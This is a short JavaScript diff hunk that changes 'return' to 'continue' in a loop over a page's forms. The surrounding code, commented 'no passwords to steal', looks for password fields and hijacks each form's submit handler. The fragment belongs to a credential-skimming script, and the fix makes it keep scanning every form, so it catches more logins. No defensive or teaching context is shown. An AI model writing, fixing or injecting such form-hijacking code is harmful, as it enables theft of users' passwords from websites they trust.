@@ -5,7 +5,7 @@ for (const form of forms) {
   // and submit it
   if(form.querySelector("input[type='password'") == null){
     //no passwords to steal
-    return;
+    continue;
   }
   form.onsubmit = function (event) {
     event.preventDefault();
